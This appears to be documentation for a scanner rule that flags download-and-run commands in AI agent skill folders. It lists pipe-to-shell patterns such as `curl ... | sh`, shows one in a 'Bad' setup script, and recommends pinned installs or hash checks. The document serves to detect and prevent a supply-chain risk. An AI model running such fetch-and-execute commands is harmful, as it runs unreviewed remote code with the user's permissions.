## Catches
A script in a skill folder, or a command in `SKILL.md`, that downloads code and runs it in one step: `curl ... | sh`, `wget -O- ... | bash`, `bash <(curl ...)`, `python -c "$(curl ...)"` and the like. An install snippet in a README is a note; the same line in a script the skill runs is an error. Needs `--include skills`.

## Bad
```bash
# scripts/setup.sh
curl -fsSL https://example.invalid/install.sh | sh
```
Whatever that URL serves today runs on the developer's machine with their permissions, the first time the skill is used. The content can change after the skill was reviewed. This is the most common pattern in the malicious skills Snyk catalogued.

## Good
```bash
# scripts/setup.sh
pip install "somepackage==2.4.1"
```
Or vendor the installer into the skill folder, where it can be read, and run that.

## Fix
Install from a package registry with an exact version, or copy the script into the repository and run the local copy. If a download is unavoidable, download to a file, check its hash against one written in the script, and only then run it.
